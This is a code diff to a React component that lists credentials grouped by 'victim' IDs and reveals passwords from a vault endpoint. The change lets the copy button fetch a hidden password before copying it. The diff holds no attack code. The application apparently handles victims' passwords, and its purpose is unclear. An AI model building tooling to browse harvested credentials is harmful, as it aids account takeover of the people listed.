@@ -23,13 +23,22 @@ export function CredentialTable({ victimId, global = false }: { victimId?: strin
     : `/victims/${victimId}/credentials?q=${encodeURIComponent(q)}&state=${state}&limit=100`;
   const rows = useApi<{ items: Credential[]; next: string | null }>(path);
 
-  async function reveal(row: Credential) {
+  async function reveal(row: Credential): Promise<string | null> {
     try {
       const data = await api<{ value: string }>(`/vault/credentials/${row.id}/reveal`);
       setRevealed((current) => ({ ...current, [row.id]: data.value }));
+      return data.value;
     } catch (error) {
       toast.error(error instanceof Error ? error.message : 'No se pudo revelar');
+      return null;
     }
+  }
+
+  async function copyRow(row: Credential) {
+    const value = revealed[row.id] ?? await reveal(row);
+    if (!value) return;
+    void navigator.clipboard.writeText(value);
+    toast.success('Contraseña copiada');
   }
 
   const items = rows.data?.items ?? [];
@@ -63,7 +72,7 @@ export function CredentialTable({ victimId, global = false }: { victimId?: strin
                       <Button size="icon" variant="ghost" aria-label="Ver contraseña" onClick={() => revealed[row.id] ? setRevealed((current) => { const next = { ...current }; delete next[row.id]; return next; }) : reveal(row)}>
                         {revealed[row.id] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                       </Button>
-                      <Button size="icon" variant="ghost" aria-label="Copiar contraseña" onClick={() => { void navigator.clipboard.writeText(revealed[row.id] ?? ''); toast.success('Contraseña copiada'); }}><Copy className="h-3 w-3" /></Button>
+                      <Button size="icon" variant="ghost" aria-label="Copiar contraseña" onClick={() => void copyRow(row)}><Copy className="h-3 w-3" /></Button>
                     </span>
                   ) : null}
                 </TD>
